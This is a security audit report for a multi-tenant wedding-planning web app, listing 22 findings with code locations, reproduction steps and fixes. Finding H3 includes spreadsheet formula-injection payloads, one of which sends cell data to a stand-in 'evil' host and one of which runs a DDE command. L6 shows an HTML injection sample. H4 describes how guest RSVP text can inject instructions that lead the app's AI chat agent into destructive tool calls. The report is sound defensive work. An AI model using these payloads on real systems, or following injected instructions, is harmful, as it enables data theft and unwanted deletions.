# Bug Bounty Audit — Round 2 — 2026-06-24

Follow-up sweep after the round-1 fixes (#129–#134) merged. This round targets
surface **round 1 under-covered**: the AI assistant, the *other* admin server
actions (vendors/documents/content/settings), onboarding & platform-admin,
wedding creation, file-upload routers, and data export. As before, each finding
carries a **Status**:

- **Verified** — code path read end-to-end and personally re-confirmed this round.
- **Reported** — surfaced by an audit pass with high confidence; code cited but
  not personally re-traced. Confirm before/while fixing.

> Round-1 items already documented in `docs/bug-bounty-audit.md` are **not**
> repeated here. Everything below is new.

## Root cause themes (round 2)

1. **The registry-class IDOR is wider than round 1 found.** Round 1 fixed
   `parties/gifts/registry/todos`, but the *same* pattern — `isAdmin(weddingId)`
   passes, then the mutation runs `where: { id }` with **no `weddingId`** — is
   still live in **vendors** and **documents** actions. Same one-line fix shape.
2. **Trusting client-supplied identity for the tenant.** `uploadOnboardingPhotos`
   takes a `weddingId` *argument* and never checks `isAdmin`. The wedding-context
   resolver trusts an inbound `x-wedding-id` header that middleware never sets or
   strips. UploadThing authz is derived from the spoofable `Referer`. The fix
   shape: never trust client-provided tenant identity — bind to server-resolved,
   admin-checked context.
3. **The AI assistant is a new, powerful surface.** Cross-tenant scoping in the
   tools is actually correct (good), but the chat agent exposes *destructive
   write tools* gated only by a model-controlled "please confirm" instruction,
   while untrusted guest free-text (notes, dietary) enters the model context —
   a prompt-injection → destructive-action path. No rate limiting anywhere.
4. **Untrusted data into spreadsheets and emails.** Guest names (attacker-
   controlled via public RSVP) flow unescaped into CSV/XLSX exports (formula
   injection) and into inline-HTML admin emails (HTML injection).

---

## Severity summary (22 findings)

| ID | Severity | Status | Title |
|----|----------|--------|-------|
| C1 | Critical | Verified | `uploadOnboardingPhotos`: any logged-in user writes photos to any wedding |
| H1 | High | Verified | `vendors` service-link update/delete/reorder not scoped by `weddingId` |
| H2 | High | Verified | `documents` update/delete not scoped by `weddingId` |
| H3 | High | Verified | CSV/XLSX formula injection in guest export (unauthenticated source) |
| H4 | High | Reported | AI chat: prompt-injection can trigger destructive write tools |
| M1 | Medium | Verified | Inbound `x-wedding-id` header trusted by context resolver (not stripped) |
| M2 | Medium | Reported | Guest POST adopts a `partyId` (+invite code) from another wedding |
| M3 | Medium | Reported | Guest POST writes `guestEventInvite` rows for another wedding's events |
| M4 | Medium | Verified | `inviteCode` in default export columns → token leak via emailed exports |
| M5 | Medium | Reported | Slug squatting: onboarding reserved-list diverges from middleware |
| M6 | Medium | Reported | `createWedding` not transactional → ownerless wedding on partial failure |
| M7 | Medium | Reported | `inviteAdmin` mints `owner`-role admins by raw email, no accept flow |
| M8 | Medium | Reported | No rate limiting on any AI route (LLM cost DoS) |
| M9 | Medium | Reported | Unbounded input size into AI prompts |
| M10 | Medium | Reported | UploadThing authz derived from spoofable `Referer`; upload not wedding-bound |
| M11 | Medium | Reported | `featureToggles` / `status` mass-assignment accepted unvalidated |
| L1 | Low | Reported | `removeAdmin` can remove the last owner (tenant self-lockout) |
| L2 | Low | Reported | Emailed export recipients not restricted to wedding admins |
| L3 | Low | Reported | AI provider error messages leaked to client |
| L4 | Low | Reported | AI `bulkInvite`/`createEvent` operate over full guest list unbounded |
| L5 | Low | Reported | `deleteGuest` tool deletes by id without `weddingId` (defense-in-depth) |
| L6 | Low | Reported | Onboarding "new wedding" admin email injects unescaped user input |

---

## Critical

### C1 — `uploadOnboardingPhotos` writes photos to any wedding with no admin check
- **Status**: Verified
- **Location**: `apps/web/app/onboarding/actions.ts:270-306`
- **Description**: The action signature is `uploadOnboardingPhotos(weddingId: string, formData)`. It checks `currentUser()` (authentication only) and then `db.photo.createMany({ data: photoRecords })` using the **client-supplied `weddingId`**. It never calls `isAdmin(weddingId)` or verifies the caller owns that wedding.
- **Reproduction**: As any logged-in user, invoke the server action `uploadOnboardingPhotos("<victim-wedding-uuid>", formData)` with image files → rows inserted against the victim wedding, shown on its public site.
- **Impact**: Cross-tenant content injection / site defacement — arbitrary (including abusive) images on any couple's public wedding page.
- **Fix**: Add `const auth = await isAdmin(weddingId); if (!auth.authorized) return { success: false, error: "Forbidden" }`. Better: don't accept a client `weddingId` — resolve it from the just-created wedding / the caller's owner relationship.

---

## High

### H1 — `vendors` service-link mutations not scoped by `weddingId`
- **Status**: Verified
- **Location**: `apps/web/app/[slug]/admin/vendors/actions.ts:116` (`updateServiceLink`), `:146` (`deleteServiceLink`), `:167` (`reorderServiceLinks`)
- **Description**: All three call `isAdmin(weddingId)` against the trusted context, then mutate by raw id: `db.serviceLink.update({ where: { id } })`, `.delete({ where: { id } })`, and a `Promise.all` of `update({ where: { id } })`. `ServiceLink` has a non-null `weddingId` column (`schema.prisma:435`). Same class as the round-1 registry bug; `hotels`/`activities` already do this correctly with `updateMany({ where: { id, weddingId } })`.
- **Reproduction**: Admin of wedding A calls `deleteServiceLink("<wedding-B-link-id>")` (or `updateServiceLink`) → B's vendor link is deleted/edited. `update` returns the mutated row, leaking B's data.
- **Impact**: Cross-tenant tamper/delete of vendor links by any wedding admin.
- **Fix**: `updateMany`/`deleteMany` with `{ id, weddingId }` + count check; reorder in a `$transaction` of scoped `updateMany`s.

### H2 — `documents` update/delete not scoped by `weddingId`
- **Status**: Verified
- **Location**: `apps/web/app/[slug]/admin/documents/actions.ts:99` (`updateDocument`), `:127` (`deleteDocument`)
- **Description**: Both `isAdmin`-gated, then `db.document.update({ where: { id } })` / `.delete({ where: { id } })` with no `weddingId`. `Document.weddingId` is non-null (`schema.prisma:37`); `getDocuments` is correctly scoped, making the write paths inconsistent.
- **Reproduction**: Admin of A calls `deleteDocument("<wedding-B-doc-id>")` → B's document (contract/receipt/floor-plan) deleted.
- **Impact**: Cross-tenant deletion/tampering of uploaded documents.
- **Fix**: `updateMany`/`deleteMany` with `{ id, weddingId }` + count check.

### H3 — CSV/XLSX formula injection in guest export
- **Status**: Verified
- **Location**: `apps/web/lib/export/serialize.ts:18-24` (`escapeCsvField`), `:43-49` (`toXlsx` `addRow`)
- **Description**: `escapeCsvField` only quotes when a value contains `[",\r\n]`; it never neutralizes leading formula characters (`= + - @ \t \r`). `toXlsx` passes raw strings to `sheet.addRow`, and ExcelJS treats a leading `=` as a real formula. Guest-controlled fields (name, dietary, address, notes) reach the export via the `text()` accessor (`guest-columns.ts`) with no neutralization. The source is **unauthenticated**: the public RSVP endpoint (`app/api/events/rsvp/public/route.ts`) lets anyone create guests with attacker-chosen names.
- **Reproduction**: Self-register with `firstName` = `=HYPERLINK("http://evil/?x="&CONCATENATE(B2),"click")` (or `=cmd|'/C calc'!A0`). When the couple downloads and opens the export, the formula executes — data exfiltration via HYPERLINK/WEBSERVICE or DDE command execution.
- **Impact**: Remote, unauthenticated stored formula injection landing in the planner's spreadsheet → PII exfiltration / phishing / command execution on their machine.
- **Fix**: Neutralize leading formula chars before serialization — prefix `'` (or `\t`) when `/^[=+\-@\t\r]/.test(value)` — applied in both `escapeCsvField` and before `addRow` in `toXlsx`.

### H4 — AI chat: prompt-injection can trigger destructive write tools
- **Status**: Reported
- **Location**: `apps/web/lib/ai/tools/wedding-tools.ts` write tools (`updateGuestRsvp:442`, `createGuest:472`, `updateGuest:561`, `deleteGuest:627`, `bulkInvite:684`, `createEvent:833`, `resendInvite:327`); system prompt `apps/web/lib/ai/prompts/chat.ts:15-26`; route `app/api/admin/ai/chat/route.ts:161-183`
- **Description**: The chat agent (`stopWhen: stepCountIs(5)`) exposes write/email tools whose only guardrail before destructive actions is a soft system-prompt instruction ("confirm with the user"). The model also ingests untrusted guest free-text: `getGuestsByStatus` returns `notes`, `getDietarySummary`/`lookupGuest` return `dietaryRestrictions`. A guest can set those fields to an injection payload; when an admin later asks a routine question that calls those read tools, the payload enters context alongside the destructive tools and can drive `deleteGuest`/`bulkInvite`/`updateGuest` calls under the admin's authority (multi-step chaining is encouraged). Cross-tenant scoping of the tools themselves is correct (all bound to the closure `weddingId`).
- **Reproduction**: Guest submits RSVP with `dietaryRestrictions` = an instruction to delete a guest / mass-invite. Admin opens AI chat, asks "summarize dietary needs" → model ingests payload, may call destructive tools.
- **Impact**: Injected content drives destructive mutations (delete guests, flip RSVPs, mass-send invites = spend + spam) without genuine confirmation.
- **Fix**: Don't rely on prompt-level confirmation for state-changing tools — return a "proposed action" requiring a separate explicit admin POST to execute, or gate writes behind a server-set confirmation token. Quarantine untrusted fields in clearly delimited, instruction-neutralized blocks before they enter context.

---

## Medium

### M1 — Inbound `x-wedding-id` header is trusted by the context resolver
- **Status**: Verified
- **Location**: `apps/web/lib/db/wedding-context.ts:104-119` (reads `x-wedding-id` first), `apps/web/proxy.ts:128-141` (only ever sets `x-wedding-slug`; never strips inbound `x-wedding-id`)
- **Description**: `getWeddingContext()` resolves `x-wedding-id` **before** `x-wedding-slug`, but middleware only ever sets `x-wedding-slug` and, in the no-slug branch, forwards `NextResponse.next()` without sanitizing inbound headers. So a client-supplied `x-wedding-id` passes through verbatim and is trusted as the tenant. Admin routes are largely protected in practice because authorization re-checks `isAdmin` against that *same* resolved id (so spoofing it just denies). The risk is the principle plus any context-resolving path that doesn't re-check admin against the id (public/data reads, context fields, the `DEFAULT_WEDDING_SLUG` fallback): tenant resolution should never hinge on a header the app neither sets nor strips.
- **Reproduction**: Send any request with header `x-wedding-id: <arbitrary-wedding-uuid>`; `getWeddingContext()` returns that wedding.
- **Impact**: Tenant-isolation defense-in-depth gap; a spoofable header steers server-resolved wedding context.
- **Fix**: In middleware, strip/overwrite `x-wedding-id` (and `x-wedding-slug`) from the incoming request on **all** branches before forwarding; only ever read an `x-wedding-id` that middleware itself set after validation.

### M2 — Guest POST adopts a `partyId` (and invite code) from another wedding
- **Status**: Reported
- **Location**: `apps/web/app/api/admin/guests/route.ts:96-107`
- **Description**: When `partyId` is in the body, the route does `db.party.findUnique({ where: { id: partyId } })` (no `weddingId`) and assigns the new guest that party's `id` and `inviteCode`. Every other lookup in the file is wedding-scoped; this one isn't. (Sibling of round-1 M1, which was the PATCH path.)
- **Reproduction**: Admin of A: `POST /api/admin/guests` with `{ firstName, partyId: "<B-party-id>" }` → new guest gets B's party + B's invite code.
- **Impact**: Cross-tenant party grafting; harvests another wedding's party invite code (usable on public `/rsvp?code=`).
- **Fix**: `db.party.findFirst({ where: { id: partyId, weddingId } })`; 404 if not found.

### M3 — Guest POST writes invite rows for another wedding's events
- **Status**: Reported
- **Location**: `apps/web/app/api/admin/guests/route.ts:222-237`
- **Description**: Body `eventIds` are written straight into `guestEventInvite.createMany` with no ownership check. `GuestEventInvite.eventId` FKs `Event` with only `@@unique([guestId, eventId])`; a foreign `eventId` satisfies the FK, creating a row bearing wedding A's `weddingId` but wedding B's `eventId`.
- **Reproduction**: Admin of A: `POST /api/admin/guests` with `{ firstName, eventIds: ["<B-event-id>"] }` → cross-tenant invite row created.
- **Impact**: Cross-tenant write / invite-count pollution; potential surfacing of B's event via the invite relation.
- **Fix**: Filter `eventIds` to `db.event.findMany({ where: { id: { in: eventIds }, weddingId } })` before insert.

### M4 — `inviteCode` is exported by default → token leak via emailed exports
- **Status**: Verified
- **Location**: `apps/web/lib/export/guest-columns.ts:153-157` + `DEFAULT_EXPORT_COLUMN_KEYS:166`; emailed-export path `app/api/admin/guests/export/route.ts:91-108`
- **Description**: `inviteCode` (the per-guest RSVP credential) is in the default column set, so every export — including exports emailed as attachments to arbitrary recipient addresses — contains all guests' invite codes in cleartext.
- **Reproduction**: Admin emails an export (default columns) to `planner@vendor.example`; the attachment contains an `Invite Code` column for every guest. Anyone with the file can RSVP/alter info as any guest.
- **Impact**: Leakage of auth-equivalent tokens to third parties via a routine action.
- **Fix**: Remove `inviteCode` from `DEFAULT_EXPORT_COLUMN_KEYS` (opt-in only), and/or exclude it from the email-delivery path; optionally gate behind `owner`/`superadmin`.

### M5 — Slug squatting: onboarding reserved-list diverges from middleware
- **Status**: Reported
- **Location**: `apps/web/app/onboarding/actions.ts:11-22` (`RESERVED_SLUGS`) vs `apps/web/proxy.ts:18-44` (`RESERVED_PATHS` + `LEGACY_PATHS`)
- **Description**: `RESERVED_SLUGS` omits `platform-admin` (a reserved path) and all `LEGACY_PATHS` (`rsvp`, `hotels`, `things-to-do`, `events`, `photos`, `registry`, `trip-planner`, `vendors`, `slideshow`, `unauthorized`). The slug regex permits them, so `createWedding` accepts these slugs.
- **Reproduction**: Onboard a wedding with slug `registry` or `platform-admin` → row created; middleware then shadows/route-collides it, and the namespace is consumed.
- **Impact**: Reserved-namespace squatting, route shadowing, slug-availability DoS; latent footgun from the two divergent lists.
- **Fix**: Share one reserved-paths constant between `proxy.ts` and `validateSlug`, and include `LEGACY_PATHS` in the disallow set.

### M6 — `createWedding` is not transactional → ownerless wedding on partial failure
- **Status**: Reported
- **Location**: `apps/web/app/onboarding/actions.ts:43-49, 78-106`
- **Description**: `validateSlug` (a `findUnique` check) and `db.wedding.create` aren't atomic (TOCTOU; the unique constraint catches real collisions but surfaces a generic error), and `wedding.create` + `weddingAdmin.create` + events/templates/content aren't wrapped in a `$transaction`. A failure after `wedding.create` leaves a wedding with no owner admin row.
- **Reproduction**: Force `weddingAdmin.create` to fail after `wedding.create` → ownerless wedding (couple can't manage admins; recoverable only by superadmin).
- **Impact**: Inconsistent state / ownerless tenants; foundation for claiming-escalation.
- **Fix**: Wrap wedding + owner-admin (+ seed data) in `db.$transaction`; catch Prisma `P2002` on slug for a precise "URL taken" message.

### M7 — `inviteAdmin` mints `owner`-role admins by raw email with no accept flow
- **Status**: Reported
- **Location**: `apps/web/app/[slug]/admin/settings/actions.ts:346-383`
- **Description**: `inviteAdmin` permits role `"owner"` and creates the `weddingAdmin` row immediately with a raw email (no verification/acceptance). `isAdmin` matches on `email` OR `clerkUserId`, so inserting an attacker-controlled email grants that email owner access on next sign-in.
- **Reproduction**: An owner adds `attacker@evil.com` as `owner`; that account gets owner access by email match on sign-in — a persistent backdoor with no consent step.
- **Impact**: Self-perpetuating owner access seeded by email; combined with M6's ownerless weddings, enables claiming.
- **Fix**: Restrict invited role to `editor` (or require an accept-invite token before granting `owner`); bind grants to a verified Clerk user id, not free-text email.

### M8 — No rate limiting on any AI route (LLM cost DoS)
- **Status**: Reported
- **Location**: `app/api/admin/ai/{chat,email-draft/generate,rsvp-insights/generate,story/generate,todos/generate}/route.ts`
- **Description**: No throttling on any AI route. `chat` runs up to 5 model steps with `maxDuration = 60`; structured routes use `maxOutputTokens: 4000`. Any per-wedding admin/editor can loop requests and burn the shared provider key.
- **Fix**: Per-wedding/per-user rate limiting + daily token budget.

### M9 — Unbounded input size into AI prompts
- **Status**: Reported
- **Location**: `chat/route.ts:15-25` (no message count/size cap), `story/generate/route.ts:13-24` (`bulletPoints`), `email-draft/generate/route.ts:17-35` (`intent`/`variables`), `todos/generate/route.ts:18-22` (`customPrompt`)
- **Description**: Schemas don't bound message count, per-part text size, or body field lengths; large inputs flow into the model.
- **Fix**: Add Zod `.max()` bounds on message count, text parts, and the free-text fields.

### M10 — UploadThing authz derived from spoofable `Referer`; upload not wedding-bound
- **Status**: Reported
- **Location**: `apps/web/lib/uploadthing.ts:11-26` (`checkAdmin`), `:40-64` (`onUploadComplete`), `app/api/uploadthing/route.ts`, `proxy.ts:114-122`
- **Description**: For `/api/uploadthing` there's no `[slug]` in the URL, so the wedding is resolved from the **`Referer`** header (`getSlugFromReferer`). `checkAdmin` then authorizes against that referer-named wedding. `onUploadComplete` returns only the file URL and binds nothing to a `weddingId` (the wedding link happens later in a client-driven action with a spoofable `uploadedBy`).
- **Reproduction**: Control the `Referer` to steer which wedding context the upload authz uses; or strip it to fall back to `DEFAULT_WEDDING_SLUG`.
- **Impact**: Authz scoping for uploads depends on an untrusted header; files are stored unbound to a tenant.
- **Fix**: Pass the slug/weddingId as validated explicit input to the UploadThing endpoint and re-verify `isAdmin` against it; never use `Referer` for authz. Bind the upload to the resolved `weddingId` and set `uploadedBy` from the server-side Clerk user.

### M11 — `featureToggles` / `status` mass-assignment accepted unvalidated
- **Status**: Reported
- **Location**: `apps/web/app/[slug]/admin/settings/actions.ts:247-267` (`updateFeatureToggles`), `:162` (`status` cast in `updateGeneralSettings`); also onboarding create `actions.ts:96-104`
- **Description**: `updateFeatureToggles(data: Record<string, boolean>)` writes `data` straight into the `featureToggles` JSONB with no allow-list; `status` is `as`-cast with no runtime validation (unlike the platform-admin action which validates against an allow-list).
- **Reproduction**: `updateFeatureToggles({ arbitraryKey: true, __proto__: true })` or `updateGeneralSettings({ status: "bogus" })`.
- **Impact**: Weak input hygiene; arbitrary JSON keys persisted; violates the project's "always Zod" rule.
- **Fix**: Validate `featureToggles` against a fixed boolean-key allow-list and `status` against the enum before writing.

---

## Low

### L1 — `removeAdmin` can remove the last owner (tenant self-lockout)
- **Status**: Reported
- **Location**: `apps/web/app/[slug]/admin/settings/actions.ts:385-420`
- **Description**: `removeAdmin` is correctly owner-gated and wedding-scoped (not an IDOR), but there's no "at least one owner must remain" guard. Removing the sole owner leaves the wedding manageable only via env superadmin.
- **Fix**: If removing an `owner`, count remaining owners and reject when it would reach 0.

### L2 — Emailed export recipients not restricted to wedding admins
- **Status**: Reported
- **Location**: `app/api/admin/guests/export/route.ts:48-63, 91-108`; `lib/export/schema.ts:36-50`
- **Description**: `parseRecipients` only validates email syntax. Any admin (incl. `editor`) can email the full guest list (PII + invite codes per M4) to any external address.
- **Fix**: Restrict recipients to known wedding-admin addresses or require `owner`/`superadmin` for email delivery; log external-domain sends.

### L3 — AI provider error messages leaked to client
- **Status**: Reported
- **Location**: `apps/web/lib/ai/client.ts:48-88`; surfaced at `email-draft/generate/route.ts:52-57`, `rsvp-insights/generate/route.ts:113-115`
- **Description**: `generateStructured` returns the raw provider `error.message`, which these two routes pass straight back to the client (request ids, quota/model details).
- **Fix**: Log detailed errors server-side; return a generic message (as the route `catch` blocks already do).

### L4 — AI `bulkInvite` / `createEvent` operate over the full guest list unbounded
- **Status**: Reported
- **Location**: `apps/web/lib/ai/tools/wedding-tools.ts:716` (`bulkInvite`), `:891-907` (`createEvent` default auto-invite)
- **Description**: Both iterate every matching guest with no cap; reachable via the H4 injection vector → mass email send.
- **Fix**: Cap recipients per call; require server-confirmed batch sends; bound/queue the auto-invite.

### L5 — `deleteGuest` tool deletes by id without `weddingId` (defense-in-depth)
- **Status**: Reported
- **Location**: `apps/web/lib/ai/tools/wedding-tools.ts:627-643`
- **Description**: A scoped `findFirst` precedes a `db.guest.delete({ where: { id } })` with no `weddingId` — currently safe via the prior check, but relies on ordering.
- **Fix**: Add `weddingId` to the delete `where`.

### L6 — Onboarding "new wedding" admin email injects unescaped user input
- **Status**: Reported
- **Location**: `apps/web/app/onboarding/actions.ts:218-236`
- **Description**: The platform-admin notification interpolates `coupleName` (derived from attacker-controlled `person1Name`/`person2Name`), `slug`, date, and creator email into an inline HTML string with no escaping.
- **Reproduction**: Onboard with `person1Name` = `<img src=x onerror=...>` → markup renders in the superadmin inbox.
- **Impact**: HTML injection into the superadmin notification mailbox.
- **Fix**: HTML-escape interpolated values, or use the Resend template mechanism (per CLAUDE.md).

---

## Checked and found correct (no action)

- **AI cross-tenant scoping is sound**: all `wedding-tools.ts` queries bind to the
  closure `weddingId` from `createWeddingTools(ctx.weddingId)`; the model cannot
  supply a `weddingId`; all five AI routes gate with `requireAdmin(ctx.weddingId)`.
- **Settings raw SQL is parameterized**: `settings/actions.ts:35` uses Prisma
  tagged-template binding (`${weddingId}::uuid`) — no injection.
- `activities`, `hotels`, `content`, `checklist-actions` actions are correctly
  `isAdmin`-gated **and** `weddingId`-scoped.
- `platform-admin` `updateWeddingStatus` / `deleteWedding` correctly call
  `verifySuperAdmin()` (ADMIN_EMAILS gate).
- Remaining admin API routes (seating generate/POST/tables, templates, photos +
  placements, guest-photos download/[id], guests search/export/resend/DELETE,
  reminders, admin-summary-config, events share/send-invites) are `requireAdmin`
  + `weddingId`-scoped; `api/photos` and `api/guest-photos` return only visible,
  wedding-scoped rows.
- Export filtering (`buildGuestExportWhere`) always pins `weddingId` and only sets
  Zod-validated enum/boolean fields — no filter/order injection or ReDoS. CSV
  quoting correctly handles delimiter/quote/newline breakouts (the only gap is
  formula neutralization, H3).

---

_Methodology: six parallel read-only hunters over AI, the remaining admin server
actions, remaining admin API routes, export/serialization, platform-admin/
onboarding, and upload/raw-SQL/public surface. The Critical/High access-control
and export findings (C1, H1, H2, H3) plus M1/M4 were personally re-traced against
source (**Verified**); the rest are agent-traced with cited code (**Reported**)._
